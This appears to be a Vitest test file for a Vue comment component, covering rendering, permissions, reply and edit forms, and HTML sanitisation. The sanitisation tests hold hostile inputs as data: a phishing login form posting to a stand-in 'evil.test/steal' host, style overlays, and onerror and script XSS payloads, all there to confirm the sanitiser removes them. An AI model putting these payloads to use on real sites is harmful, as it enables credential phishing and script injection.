import { describe, it, expect, vi, beforeEach } from 'vitest'
import { mount } from '@vue/test-utils'
import { setActivePinia, createPinia } from 'pinia'
import CommentItem from './CommentItem.vue'
import type { CommentItem as CommentItemType } from '../../types/comment'
import { useAuthStore } from '../../stores/auth'

vi.mock('vue-router', () => ({
  useRouter: () => ({ push: vi.fn() }),
  useRoute: () => ({ fullPath: '/' }),
  // AuthorName 使用 RouterLink；此測試整包 mock 了 vue-router，補一個等價的 <a> stub
  RouterLink: {
    props: ['to'],
    template: '<a :href="to" @click.prevent><slot /></a>',
  },
}))
vi.mock('../../api/commentService', () => ({
  commentService: { like: vi.fn(), unlike: vi.fn() },
}))

const baseComment: CommentItemType = {
  uuid: 'c1',
  parentUuid: null,
  content: 'hello',
  contentHtml: '<p>hello</p>',
  author: { uuid: 'u1', nickname: 'Alice', avatarUrl: null },
  likeCount: 3,
  liked: false,
  createdAt: new Date().toISOString(),
  editedAt: null,
  deleted: false,
  deletedByRole: null,
}

describe('CommentItem (Stage B)', () => {
  beforeEach(() => setActivePinia(createPinia()))

  it('正常顯示 author + content + likeCount', () => {
    const wrapper = mount(CommentItem, { props: { comment: baseComment } })
    expect(wrapper.text()).toContain('Alice')
    expect(wrapper.find('.content').html()).toContain('hello')
    expect(wrapper.find('[data-testid="comment-like-count"]').text()).toBe('3')
  })

  it('留言作者有 uuid → 作者名連到 /author/{uuid}', () => {
    const wrapper = mount(CommentItem, { props: { comment: baseComment } })
    const link = wrapper.find('a[href="/author/u1"]')
    expect(link.exists()).toBe(true)
    expect(link.text()).toBe('Alice')
  })

  it('已刪除留言不顯示作者連結', () => {
    const deleted = { ...baseComment, deleted: true, deletedByRole: 'AUTHOR' as const, author: null }
    const wrapper = mount(CommentItem, { props: { comment: deleted } })
    expect(wrapper.find('a[href^="/author/"]').exists()).toBe(false)
    expect(wrapper.text()).toContain('[已刪除]')
  })

  it('deleted=true → tombstone + 隱藏 author', () => {
    const deleted = { ...baseComment, deleted: true, deletedByRole: 'AUTHOR' as const, author: null }
    const wrapper = mount(CommentItem, { props: { comment: deleted } })
    expect(wrapper.find('.tombstone').text()).toContain('已被作者刪除')
    expect(wrapper.find('.actions').exists()).toBe(false)
  })

  it('editedAt → 顯示 (edited)', () => {
    const edited = { ...baseComment, editedAt: '2026-05-01T10:05:00Z' }
    const wrapper = mount(CommentItem, { props: { comment: edited } })
    expect(wrapper.text()).toContain('(edited)')
  })

  it('replies 巢狀渲染', () => {
    const reply: CommentItemType = { ...baseComment, uuid: 'c2', parentUuid: 'c1' }
    const withReply = { ...baseComment, replies: [reply] }
    const wrapper = mount(CommentItem, { props: { comment: withReply } })
    expect(wrapper.findAll('[data-testid="comment-item"]')).toHaveLength(2)
  })

  it('canEdit / canDelete / canReply 全 true → 顯示 3 個按鈕', async () => {
    const auth = useAuthStore()
    auth.user = {
      uuid: 'u1', email: '', nickname: '', avatarUrl: null,
      role: 'ADMIN', emailVerified: true, createdAt: '',
    }
    auth.accessToken = 't'

    const wrapper = mount(CommentItem, { props: { comment: baseComment } })
    expect(wrapper.find('[data-testid="comment-edit-btn"]').exists()).toBe(true)
    expect(wrapper.find('[data-testid="comment-delete-btn"]').exists()).toBe(true)
    expect(wrapper.find('[data-testid="comment-reply-btn"]').exists()).toBe(true)
  })

  it('non-owner non-admin → 不顯示 edit/delete', () => {
    const auth = useAuthStore()
    auth.user = {
      uuid: 'other', email: '', nickname: '', avatarUrl: null,
      role: 'USER', emailVerified: true, createdAt: '',
    }
    auth.accessToken = 't'

    const wrapper = mount(CommentItem, { props: { comment: baseComment } })
    expect(wrapper.find('[data-testid="comment-edit-btn"]').exists()).toBe(false)
    expect(wrapper.find('[data-testid="comment-delete-btn"]').exists()).toBe(false)
    expect(wrapper.find('[data-testid="comment-reply-btn"]').exists()).toBe(true)  // 已登入可 reply
  })

  it('click reply button → 顯示 reply form; cancel → 隱藏', async () => {
    const auth = useAuthStore()
    auth.user = {
      uuid: 'u1', email: '', nickname: '', avatarUrl: null,
      role: 'USER', emailVerified: true, createdAt: '',
    }
    auth.accessToken = 't'

    const wrapper = mount(CommentItem, { props: { comment: baseComment } })
    await wrapper.find('[data-testid="comment-reply-btn"]').trigger('click')
    expect(wrapper.find('[data-testid="comment-reply-form"]').exists()).toBe(true)
  })

  it('FE-09：回覆表單與編輯表單的 textarea 各有對應的可存取名稱', async () => {
    const auth = useAuthStore()
    auth.user = {
      uuid: 'u1', email: '', nickname: '', avatarUrl: null,
      role: 'USER', emailVerified: true, createdAt: '',
    }
    auth.accessToken = 't'

    const wrapper = mount(CommentItem, { props: { comment: baseComment } })
    await wrapper.find('[data-testid="comment-reply-btn"]').trigger('click')
    expect(wrapper.find('[data-testid="comment-reply-form"] textarea').attributes('aria-label')).toBe('回覆留言')
    await wrapper.find('[data-testid="comment-edit-btn"]').trigger('click')
    expect(wrapper.find('[data-testid="comment-edit-form"] textarea').attributes('aria-label')).toBe('編輯留言')
  })

  it('click edit button → 顯示 edit form 並 prefill content', async () => {
    const auth = useAuthStore()
    auth.user = {
      uuid: 'u1', email: '', nickname: '', avatarUrl: null,
      role: 'USER', emailVerified: true, createdAt: '',
    }
    auth.accessToken = 't'

    const wrapper = mount(CommentItem, { props: { comment: baseComment } })
    await wrapper.find('[data-testid="comment-edit-btn"]').trigger('click')
    expect(wrapper.find('[data-testid="comment-edit-form"]').exists()).toBe(true)
    const textarea = wrapper.find('[data-testid="comment-edit-form"] textarea')
    expect((textarea.element as HTMLTextAreaElement).value).toBe('hello')
  })
})

describe('CommentItem 留言 HTML 消毒（收緊設定）', () => {
  const render = (contentHtml: string) => {
    setActivePinia(createPinia())
    const wrapper = mount(CommentItem, { props: { comment: { ...baseComment, contentHtml } } })
    return wrapper.find('.content').element as HTMLElement
  }

  // 一個 render 只放一個會被移除的節點：happy-dom 的 NodeIterator 在節點被移除後可能略過後續兄弟節點，
  // 組合 payload 另以真實 Chromium 驗證。
  it.each([
    ['內文 <style>', '<p>a</p><style>.ov{position:fixed;inset:0}</style>'],
    ['svg 內 <style>', '<svg><style>.ov{position:fixed;inset:0}</style></svg>'],
  ])('%s 被移除，樣式內容不外洩成文字', (_label, html) => {
    const el = render(html)

    expect(el.querySelectorAll('style').length).toBe(0)
    expect(el.textContent).not.toMatch(/position:\s*fixed/)
  })

  it('style 屬性一律移除，包含偽造的 pre.shiki（Shiki 例外不外洩到留言）', () => {
    const el = render(
      '<p style="position:fixed">a</p><pre class="shiki" style="--shiki-light:#fff"><span style="--shiki-light:#fff">b</span></pre>',
    )

    expect(el.querySelectorAll('[style]').length).toBe(0)
  })

  it('釣魚 form（含 password input 與 button）整個被移除，action 不殘留', () => {
    const el = render(
      '<form action="https://evil.test/steal" method="post"><input type="password"><button>Login</button></form>',
    )

    expect(el.querySelectorAll('form, input, button').length).toBe(0)
    expect(el.querySelectorAll('[action]').length).toBe(0)
  })

  it('iframe 被移除', () => {
    expect(render('<iframe src="about:blank"></iframe>').querySelectorAll('iframe').length).toBe(0)
  })

  it.each([
    ['text', '<input type="text">'],
    ['無 type', '<input>'],
  ])('非 checkbox 的 input（%s）被移除', (_label, html) => {
    expect(render(html).querySelectorAll('input').length).toBe(0)
  })

  it('checkbox 保留', () => {
    const inputs = render('<input type="checkbox" checked>').querySelectorAll('input')

    expect(inputs.length).toBe(1)
    expect(inputs[0].getAttribute('type')).toBe('checkbox')
  })

  it('一般內容不受影響：段落、粗體、連結、script / on* 仍被移除', () => {
    const el = render('<p>hi <strong>bold</strong> <a href="https://example.com">l</a></p><img src="x" onerror="alert(1)"><script>alert(1)</script>')

    expect(el.querySelector('strong')?.textContent).toBe('bold')
    expect(el.querySelector('a')?.getAttribute('href')).toBe('https://example.com')
    expect(el.querySelectorAll('script').length).toBe(0)
    expect(el.querySelector('img')?.hasAttribute('onerror')).toBe(false)
  })

  describe('載入更多回覆（D3）', () => {
    const rep = (n: number): CommentItemType => ({ ...baseComment, uuid: `r${n}`, parentUuid: 'c1' })
    const withReplies = (replyCount: number, embedded = 3): CommentItemType => ({
      ...baseComment,
      replyCount,
      replies: Array.from({ length: embedded }, (_, i) => rep(i + 1)),
    })

    it('replyCount > replies.length → 顯示「載入更多回覆（剩 N 則）」', () => {
      const wrapper = mount(CommentItem, { props: { comment: withReplies(5) } })
      const btn = wrapper.find('[data-testid="comment-replies-load-more"]')
      expect(btn.exists()).toBe(true)
      expect(btn.text()).toContain('載入更多回覆（剩 2 則）')
    })

    it('replyCount 等於 replies.length 或未提供 → 不顯示按鈕', () => {
      expect(mount(CommentItem, { props: { comment: withReplies(3) } })
        .find('[data-testid="comment-replies-load-more"]').exists()).toBe(false)
      expect(mount(CommentItem, { props: { comment: baseComment } })
        .find('[data-testid="comment-replies-load-more"]').exists()).toBe(false)
    })

    it('點擊 → emit loadMoreReplies(頂層 uuid)', async () => {
      const wrapper = mount(CommentItem, { props: { comment: withReplies(5) } })
      await wrapper.find('[data-testid="comment-replies-load-more"]').trigger('click')
      expect(wrapper.emitted('loadMoreReplies')).toEqual([['c1']])
    })

    it('載入中 → 按鈕停用並顯示載入中', () => {
      const wrapper = mount(CommentItem, { props: { comment: withReplies(5), replyLoading: true } })
      const btn = wrapper.find('[data-testid="comment-replies-load-more"]')
      expect(btn.attributes('disabled')).toBeDefined()
      expect(btn.text()).toContain('載入中')
    })

    it('載入失敗 → 顯示錯誤訊息，按鈕改為重試且可點擊', async () => {
      const wrapper = mount(CommentItem, { props: { comment: withReplies(5), replyError: true } })
      expect(wrapper.find('[data-testid="comment-replies-error"]').text()).toContain('回覆載入失敗')
      const btn = wrapper.find('[data-testid="comment-replies-load-more"]')
      expect(btn.text()).toContain('重試')
      await btn.trigger('click')
      expect(wrapper.emitted('loadMoreReplies')).toEqual([['c1']])
    })

    it('已刪除的頂層墓碑也要能載入更多回覆', () => {
      const tomb = { ...withReplies(5), deleted: true, deletedByRole: 'AUTHOR' as const, author: null }
      const wrapper = mount(CommentItem, { props: { comment: tomb } })
      expect(wrapper.find('[data-testid="comment-replies-load-more"]').exists()).toBe(true)
    })
  })
})
